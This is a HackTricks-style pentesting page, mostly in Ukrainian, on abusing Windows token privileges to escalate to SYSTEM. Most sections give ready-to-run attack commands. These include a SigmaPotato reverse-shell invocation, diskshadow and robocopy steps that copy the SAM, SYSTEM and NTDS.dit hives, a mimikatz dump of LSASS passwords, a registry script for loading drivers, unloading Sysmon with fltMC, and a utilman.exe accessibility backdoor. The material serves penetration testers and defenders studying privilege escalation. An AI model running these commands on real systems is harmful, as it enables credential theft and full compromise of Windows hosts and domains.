# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку перед тим, як продовжити:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи токенами, які вже маєте**

### SeImpersonatePrivilege

Це привілей, який має будь-який процес і який дозволяє impersonation (але не creation) будь-якого token, якщо до нього можна отримати handle. Привілейований token можна отримати з Windows service (DCOM), змусивши його виконати NTLM authentication проти exploit, після чого стає можливим виконання процесу з привілеями SYSTEM. Цю вразливість можна експлуатувати за допомогою різних tools, таких як [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (який вимагає, щоб winrm був disabled), [SweetPotato](https://github.com/CCob/SweetPotato) та [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: на Windows 10 1809+/Server 2019+ краще використовувати **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** або **PrintSpoofer** залежно від того, який RPC/COM surface ще reachable.
- Якщо ви скомпрометували service, що працює як **`LOCAL SERVICE`** або **`NETWORK SERVICE`**, і `whoami /priv` показує **filtered token** без `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, спочатку відновіть **default privilege set** цього account (наприклад, за допомогою **FullPowers**) і після цього повторіть сімейство potato.
- Деякі новіші forks зручніші для operator, ніж оригінальні tools. Наприклад, **SigmaPotato** додає reflection/in-memory execution і сучасну сумісність з Windows, тоді як **PrintNotifyPotato** зловживає PrintNotify COM service і часто корисний, коли classic Spooler path disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Воно дуже схоже на **SeImpersonatePrivilege**, і використовує **той самий метод** для отримання привілейованого token.\
Потім цей privilege дозволяє **призначити primary token** новому/призупиненому процесу. За допомогою привілейованого impersonation token можна отримати primary token (DuplicateTokenEx).\
За допомогою token можна створити **новий процес** через 'CreateProcessAsUser' або створити процес у стані suspended і **встановити token** (зазвичай не можна змінити primary token процесу, що вже працює).

### SeTcbPrivilege

Якщо цей token увімкнено, можна використати **KERB_S4U_LOGON**, щоб отримати **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну group** (admins) до token, встановити **integrity level** token на "**medium**" і призначити цей token **поточному thread** (SetThreadToken).

### SeBackupPrivilege

Цей privilege змушує систему **надавати весь read access** до будь-якого file (обмежено лише операціями читання). Його використовують для **читання password hashes локальних Administrator** accounts із registry, після чого можна застосувати tools на кшталт "**psexec**" або "**wmiexec**" з hash (техніка Pass-the-Hash). Однак ця technique не працює за двох умов: коли Local Administrator account disabled, або коли діє policy, що забирає administrative rights у Local Administrators, які підключаються remotely.\
На практиці найнадійніший вбудований workflow зазвичай **VSS + `robocopy /b`**: створити/відкрити shadow copy, потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Ви можете **abuse this privilege** за допомогою:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** у [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Або як пояснено в розділі **escalating privileges with Backup Operators**:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Цей privilege надає право **write access** до будь-якого системного файлу, незалежно від Access Control List (ACL) файлу. Це відкриває численні можливості для escalation, зокрема можливість **modify services**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options, серед інших технік.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний privilege, особливо корисний, коли користувач має можливість impersonate tokens, але також і за відсутності SeImpersonatePrivilege. Ця можливість спирається на здатність impersonate token, який представляє того самого користувача і чий integrity level не перевищує integrity level поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можна використовувати SeCreateTokenPrivilege для EoP шляхом impersonate tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний impersonation вимагає, щоб target token належав тому самому користувачу і мав integrity level, менший або рівний integrity level процесу, що намагається виконати impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і підвищити його, додавши SID (Security Identifier) privilege-групи.

### SeLoadDriverPrivilege

Цей privilege дозволяє **load and unload device drivers** шляхом створення запису в registry зі спеціальними значеннями `ImagePath` і `Type`. Оскільки прямий write access до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, замість нього потрібно використовувати `HKCU` (HKEY_CURRENT_USER). Однак, щоб kernel розпізнав `HKCU` для конфігурації driver, потрібно дотриматися певного шляху.

Сучасне offensive використання зазвичай є **BYOVD** (bring your own vulnerable driver): завантажити **signed but vulnerable** kernel driver і потім використати його IOCTLs, щоб вимкнути protections або перейти до kernel code execution. Майте на увазі, що в recent Windows 11/Server builds **Microsoft vulnerable driver blocklist** і/або **HVCI/Memory Integrity** часто ламають старі public chains, тож класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Цей шлях — `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача. Усередині `HKCU` весь цей шлях потрібно створити, а також задати два значення:

- `ImagePath`, який є шляхом до binary, що буде виконано
- `Type`, зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Access `HKCU` замість `HKLM` через обмежений write access.
2. Create the path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` всередині `HKCU`, де `<RID>` представляє Relative Identifier поточного користувача.
3. Set `ImagePath` на execution path binary.
4. Assign `Type` як `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим privilege у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє процесу **взяти ownership об’єкта**, обходячи вимогу явного discretionary access через надання WRITE_OWNER access rights. Процес полягає спочатку в отриманні ownership цільового registry key для цілей запису, а потім у зміні DACL, щоб увімкнути write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ця привілей дозволяє **debug other processes**, включно з можливістю читати й записувати пам’ять. З цією привілеєю можна застосовувати різні стратегії memory injection, здатні обходити більшість antivirus та host intrusion prevention рішень.

На сучасних Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні токени, але це **не** гарантує, що ви зможете працювати з **LSASS**. Якщо **RunAsPPL / LSA Protection** увімкнено, non-protected processes не можуть читати або inject у LSASS навіть якщо `SeDebugPrivilege` присутня. У такому разі вкрадіть токен з іншого non-PPL SYSTEM process або поєднайте з PPL bypass/BYOVD замість того, щоб припускати, що `procdump` спрацює. Для повного прикладу копіювання токена з використанням `SeDebugPrivilege` + `SeImpersonatePrivilege` див. [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Ви можете використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) з [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це може застосовуватися до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувача після успішного входу в систему.

Потім ви можете завантажити цей дамп у mimikatz, щоб отримати паролі:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати оболонку `NT SYSTEM`, ви можете використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати raw volume device handles (наприклад, \\.\C:) для прямого disk I/O, що обходить NTFS ACLs. З ним можна копіювати байти будь-якого файлу на тому, читаючи underlying blocks, що дає змогу arbitrary file read чутливих даних (наприклад, machine private keys у %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS через VSS). Це особливо важливо на CA servers, де exfiltrating CA private key дає змогу створити Golden Certificate, щоб impersonate будь-який principal.

Дивіться детальні techniques and mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Токени, які відображаються як Disabled, зазвичай можна увімкнути, тож часто можна зловживати як _Enabled_, так і _Disabled_ привілеями.

### Enable All the tokens

Якщо у вас є disabled privileges, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цьому [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повний cheatsheet привілеїв token: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче наведено лише прямі способи використати привілей для отримання admin session або читання чутливих файлів.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Я спробую незабаром перефразувати це в більш recipe-like вигляд.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Читати чутливі файли за допомогою `robocopy /b` або спеціалізованих SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а іноді й `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціалізовані SeBackup cmdlets/APIs часто гнучкіші для locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Створити arbitrary token, включно з local admin rights, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Дублювати **non-PPL** SYSTEM token або зняти memory з non-protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping зазвичай блокується, якщо увімкнено RunAsPPL/LSA Protection.</p><p>Script можна знайти тут: [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Використати **Potato family** / named-pipe impersonation, щоб запустити SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Найпрактичніше для service accounts, таких як IIS APPPOOL, MSSQL, scheduled tasks, або будь-якого context, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Завантажити signed-but-vulnerable kernel driver (BYOVD)<br>2. Використати driver's IOCTLs, щоб отримати kernel R/W, disable security tooling або elevate to SYSTEM<br><br>Альтернативно, privilege можна використати, щоб unload security-related drivers за допомогою вбудованої команди <code>fltMC</code>, тобто <code>fltMC sysmondrv</code></p>                     | <p>Старі public drivers, такі як <code>szkg64.sys</code>, дедалі частіше blocked на modern Windows через vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустити PowerShell/ISE, маючи присутнім privilege SeRestore.<br>2. Увімкнути privilege за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменувати utilman.exe на utilman.old<br>4. Перейменувати cmd.exe на utilman.exe<br>5. Lock the console і натиснути Win+U</p> | <p>Attack може бути detected деяким AV software.</p><p>Альтернативний метод ґрунтується на заміні service binaries, що зберігаються в "Program Files", використовуючи той самий privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменувати cmd.exe на utilman.exe<br>4. Lock the console і натиснути Win+U</p>                                                                                                                                       | <p>Attack може бути detected деяким AV software.</p><p>Альтернативний метод ґрунтується на заміні service binaries, що зберігаються в "Program Files", використовуючи той самий privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Маніпулювати tokens так, щоб були включені local admin rights. Може вимагати SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Подивіться на цю table, що визначає Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Подивіться на [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) про privesc за допомогою tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
